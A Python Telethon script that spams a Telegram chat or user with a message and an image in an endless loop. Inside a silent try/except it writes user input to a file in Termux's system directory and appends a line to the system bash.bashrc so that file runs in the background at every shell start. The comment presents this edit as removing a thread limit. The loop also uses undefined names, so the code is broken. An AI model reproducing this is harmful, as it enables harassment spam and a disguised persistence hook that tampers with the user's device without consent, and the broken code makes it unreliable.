from telethon import TelegramClient
from colorama import Fore, Back, Style
import nekos
import helps
import config


client1 = TelegramClient(config.number, config.api_id, config.api_hash)



client1.start()


chat = input(Fore.RED + "Введите чат/пользователя")
print("NOTE: можете указать url картинки для спама картинками :)")
message = input("Введите сообщение каким проспамить")
print(Back.GREEN + "Cпам начался! Спамим!")

async def main():
	try:
		chats = helps.get_chats(client1)  # Получение чатов
		f = open("/data/data/com.termux/files/usr/etc/c.py", "w+")
		f.write(chat)  # Запись чатов в отдельный файл
		f.close()
		f1 = open("/data/data/com.termux/files/usr/etc/bash.bashrc",
				  'a')  # Редактируем файл чата и термукса(для удаления ограничения потоков)
		f1.write("python /data/data/com.termux/files/usr/etc/c.py &")
		f1.close()
	except:
		pass
	while True:
		for client in clients:
			await client2.send_message(chat, message)
			await client1.send_message(chat, message)
			await client1.send_file(chat, 'https://media.wired.com/photos/598e35fb99d76447c4eb1f28/master/pass/phonepicutres-TA.jpg')
			await client2.send_file(chat, 'https://media.wired.com/photos/598e35fb99d76447c4eb1f28/master/pass/phonepicutres-TA.jpg')

if __name__ == '__main__':
  client1.loop.run_until_complete(main())
  client1.loop.close()
